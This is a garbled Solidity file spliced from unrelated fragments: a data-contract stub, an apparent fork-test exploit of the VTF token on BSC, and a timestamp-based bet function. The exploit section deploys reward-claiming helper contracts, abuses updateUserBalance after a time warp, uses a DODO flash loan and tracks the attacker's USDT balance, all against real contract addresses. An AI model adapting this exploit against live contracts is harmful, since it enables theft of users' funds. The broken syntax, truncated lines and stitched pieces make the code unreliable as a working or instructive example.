
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IVTF is IERC20{
    function updateUserBalance(address _user) external};
interface IROUTER {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external};
contract claimReward{
    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    constructor(){
        VTF.updateUserBalance(address(this))};
    function claim(address receiver) external{
        VTF.updateUserBalance(address(this));
        VTF.transfer(receiver, VTF.balanceOf(address(this)))};
contract ContractTest is DSTest{
    address constant dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    IVTF VTF = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IROUTER Router = IROUTER(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);
    address [] public contractList;
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheat.createSelectFork("bsc", 22535101)};
    function testExploit() public{
        contractFactory();
        cheat.warp(block.timestamp + 2 * 24 * 60 * 60);
        DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker USDT balance
function bet() public {
    require(block.timestamp % 2 == 0, "Unfair time-based logic")}